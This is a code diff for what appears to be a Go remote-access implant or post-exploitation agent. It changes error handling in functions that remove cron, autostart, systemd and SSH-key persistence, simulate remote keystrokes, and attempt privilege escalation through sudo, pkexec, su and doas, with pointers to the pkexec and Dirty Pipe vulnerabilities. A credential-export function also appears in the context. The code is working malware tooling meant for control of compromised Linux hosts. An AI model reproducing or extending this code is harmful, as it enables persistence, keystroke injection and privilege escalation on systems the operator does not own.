@@ -139,12 +139,13 @@ X-GNOME-Autostart-enabled=true
 }
 
 // removePersistenceLinux removes cron and autostart entries installed by addPersistenceLinux().
-func removePersistenceLinux() {
+func removePersistenceLinux() string {
 	exe, err := os.Executable()
 	if err != nil {
-		return
+		return "persistence: failed to resolve executable path: " + err.Error()
 	}
 	absExe, _ := filepath.Abs(exe)
+	var errs []string
 
 	// Remove crontab entry
 	existing, err := exec.Command("crontab", "-l").Output()
@@ -158,15 +159,24 @@ func removePersistenceLinux() {
 		newCron := strings.Join(newLines, "\n")
 		cmd := exec.Command("crontab", "-")
 		cmd.Stdin = strings.NewReader(newCron)
-		_ = cmd.Run()
+		if out, err := cmd.CombinedOutput(); err != nil {
+			errs = append(errs, fmt.Sprintf("crontab write: %v %s", err, string(out)))
+		}
 	}
 
 	// Remove autostart desktop file
 	home := os.Getenv("HOME")
 	if home != "" {
 		desktopPath := filepath.Join(home, ".config", "autostart", sanitizeLabel(persistencePrefix)+".desktop")
-		os.Remove(desktopPath)
+		if err := os.Remove(desktopPath); err != nil && !os.IsNotExist(err) {
+			errs = append(errs, fmt.Sprintf("autostart remove: %v", err))
+		}
 	}
+
+	if len(errs) > 0 {
+		return "persistence: Linux entry cleanup incomplete: " + strings.Join(errs, "; ")
+	}
+	return "persistence: Linux entries removed (cron+autostart)"
 }
 
 // getLinuxDistro detects the Linux distribution from /etc/os-release.
@@ -1200,10 +1210,10 @@ func exportVpnCreds() string {
 	return strings.Join(results, "\n")
 }
 
-func remoteInputDispatch(payload string) string {
+func remoteInputDispatch(payload string) (string, error) {
 	// Use xdotool or ydotool to simulate keyboard input on Linux
 	if payload == "" {
-		return "remote_input: no payload provided"
+		return "", fmt.Errorf("remote_input: no payload provided")
 	}
 
 	// Try xdotool first (X11), then ydotool (Wayland)
@@ -1215,7 +1225,7 @@ func remoteInputDispatch(payload string) string {
 	var lastErr string
 	for _, args := range xdotoolCmds {
 		if _, err := exec.Command(args[0], args[1:]...).Output(); err == nil {
-			return fmt.Sprintf("remote_input: sent via %s: %s", args[0], payload)
+			return fmt.Sprintf("remote_input: sent via %s: %s", args[0], payload), nil
 		} else {
 			lastErr = err.Error()
 		}
@@ -1223,7 +1233,7 @@ func remoteInputDispatch(payload string) string {
 
 	// Try ydotool
 	if _, err := exec.Command("ydotool", "type", payload).Output(); err == nil {
-		return fmt.Sprintf("remote_input: sent via ydotool: %s", payload)
+		return fmt.Sprintf("remote_input: sent via ydotool: %s", payload), nil
 	}
 
 	// Try direct /dev/uinput or /dev/input write (requires root)
@@ -1233,12 +1243,12 @@ func remoteInputDispatch(payload string) string {
 			if f, err := os.OpenFile(dev, os.O_WRONLY, 0); err == nil {
 				f.Write([]byte(payload))
 				f.Close()
-				return fmt.Sprintf("remote_input: sent via %s: %s", dev, payload)
+				return fmt.Sprintf("remote_input: sent via %s: %s", dev, payload), nil
 			}
 		}
 	}
 
-	return fmt.Sprintf("remote_input: failed (install xdotool for X11 or ydotool for Wayland): %s", lastErr)
+	return "", fmt.Errorf("remote_input: failed (install xdotool for X11 or ydotool for Wayland): %s", lastErr)
 }
 
 func applyPersistence(method string, args string) string {
@@ -1397,10 +1407,25 @@ func removePersistence(method string, args string) string {
 		if args != "" {
 			serviceName = args
 		}
-		exec.Command("systemctl", "stop", serviceName).Run()
-		exec.Command("systemctl", "disable", serviceName).Run()
-		os.Remove(fmt.Sprintf("/etc/systemd/system/%s.service", serviceName))
-		exec.Command("systemctl", "daemon-reload").Run()
+		var errs []string
+		for _, s := range [][]string{
+			{"systemctl", "stop", serviceName},
+			{"systemctl", "disable", serviceName},
+		} {
+			if out, err := exec.Command(s[0], s[1:]...).CombinedOutput(); err != nil {
+				errs = append(errs, fmt.Sprintf("%s: %v %s", strings.Join(s, " "), err, string(out)))
+			}
+		}
+		unitPath := fmt.Sprintf("/etc/systemd/system/%s.service", serviceName)
+		if err := os.Remove(unitPath); err != nil && !os.IsNotExist(err) {
+			errs = append(errs, fmt.Sprintf("remove %s: %v", unitPath, err))
+		}
+		if out, err := exec.Command("systemctl", "daemon-reload").CombinedOutput(); err != nil {
+			errs = append(errs, fmt.Sprintf("daemon-reload: %v %s", err, string(out)))
+		}
+		if len(errs) > 0 {
+			return fmt.Sprintf("persistence: systemd cleanup incomplete: %s", strings.Join(errs, "; "))
+		}
 		return fmt.Sprintf("persistence: systemd service %s removed", serviceName)
 	case "ssh", "ssh_authorized_keys":
 		home := os.Getenv("HOME")
@@ -1409,24 +1434,28 @@ func removePersistence(method string, args string) string {
 		}
 		authFile := filepath.Join(home, ".ssh", "authorized_keys")
 		if args != "" {
-			data, _ := os.ReadFile(authFile)
+			data, err := os.ReadFile(authFile)
+			if err != nil {
+				return fmt.Sprintf("persistence: failed to read authorized_keys: %v", err)
+			}
 			var newLines []string
 			for _, line := range strings.Split(string(data), "\n") {
 				if !strings.Contains(line, args) {
 					newLines = append(newLines, line)
 				}
 			}
-			os.WriteFile(authFile, []byte(strings.Join(newLines, "\n")), 0600)
+			if err := os.WriteFile(authFile, []byte(strings.Join(newLines, "\n")), 0600); err != nil {
+				return fmt.Sprintf("persistence: failed to update authorized_keys: %v", err)
+			}
 			return "persistence: SSH key removed from authorized_keys"
 		}
 		return "persistence: specify key fragment to remove from authorized_keys"
 	default:
-		removePersistenceLinux()
-		return "persistence: Linux entries removed (cron+autostart)"
+		return removePersistenceLinux()
 	}
 }
 
-func uacBypass(method, payload string) string {
+func uacBypass(method, payload string) (string, error) {
 	if payload == "" {
 		payload = "whoami"
 	}
@@ -1437,41 +1466,41 @@ func uacBypass(method, payload string) string {
 		// Try sudo with NOPASSWD first
 		out, err := runShell(fmt.Sprintf("sudo -n %s", payload), "")
 		if err == nil {
-			return fmt.Sprintf("uac_bypass: sudo (NOPASSWD) succeeded\n%s", out)
+			return fmt.Sprintf("uac_bypass: sudo (NOPASSWD) succeeded\n%s", out), nil
 		}
-		return fmt.Sprintf("uac_bypass: sudo NOPASSWD failed: %v\n%s", err, out)
+		return fmt.Sprintf("uac_bypass: sudo NOPASSWD failed: %v\n%s", err, out), err
 
 	case "pkexec":
 		out, err := runShell(fmt.Sprintf("pkexec %s", payload), "")
 		if err == nil {
-			return fmt.Sprintf("uac_bypass: pkexec succeeded\n%s", out)
+			return fmt.Sprintf("uac_bypass: pkexec succeeded\n%s", out), nil
 		}
-		return fmt.Sprintf("uac_bypass: pkexec failed: %v\n%s", err, out)
+		return fmt.Sprintf("uac_bypass: pkexec failed: %v\n%s", err, out), err
 
 	case "su", "su_root":
 		// su with password - will likely fail without password input
 		out, err := runShell(fmt.Sprintf("echo '%s' | su - root -c '%s' 2>/dev/null", payload, payload), "")
 		if err == nil && !strings.Contains(out, "Authentication failure") {
-			return fmt.Sprintf("uac_bypass: su succeeded\n%s", out)
+			return fmt.Sprintf("uac_bypass: su succeeded\n%s", out), nil
 		}
 		// Try without password (if running as root already)
 		out, err = runShell(fmt.Sprintf("su -c '%s'", payload), "")
 		if err == nil {
-			return fmt.Sprintf("uac_bypass: su (no password) succeeded\n%s", out)
+			return fmt.Sprintf("uac_bypass: su (no password) succeeded\n%s", out), nil
 		}
-		return fmt.Sprintf("uac_bypass: su failed: %v", err)
+		return fmt.Sprintf("uac_bypass: su failed: %v", err), err
 
 	case "doas":
 		out, err := runShell(fmt.Sprintf("doas %s", payload), "")
 		if err == nil {
-			return fmt.Sprintf("uac_bypass: doas succeeded\n%s", out)
+			return fmt.Sprintf("uac_bypass: doas succeeded\n%s", out), nil
 		}
-		return fmt.Sprintf("uac_bypass: doas failed: %v\n%s", err, out)
+		return fmt.Sprintf("uac_bypass: doas failed: %v\n%s", err, out), err
 
 	case "polkit", "pkaction":
 		// Check polkit version for known vulns
 		verOut, _ := runShell("pkaction --version 2>/dev/null || pkcheck --version 2>/dev/null", "")
-		return fmt.Sprintf("uac_bypass: polkit version: %s\nUse privesc_check for CVE-2021-4034 (pkexec) and CVE-2022-0847 (Dirty Pipe)", verOut)
+		return fmt.Sprintf("uac_bypass: polkit version: %s\nUse privesc_check for CVE-2021-4034 (pkexec) and CVE-2022-0847 (Dirty Pipe)", verOut), nil
 
 	case "all":
 		var sb strings.Builder
@@ -1494,10 +1523,10 @@ func uacBypass(method, payload string) string {
 		} else {
 			sb.WriteString(fmt.Sprintf("[-] doas not available or failed\n"))
 		}
-		return sb.String()
+		return sb.String(), nil
 
 	default:
-		return fmt.Sprintf("uac_bypass: unknown method '%s' on Linux (supported: sudo, pkexec, su, doas, polkit, all)", method)
+		return "", fmt.Errorf("uac_bypass: unknown method '%s' on Linux (supported: sudo, pkexec, su, doas, polkit, all)", method)
 	}
 }
 
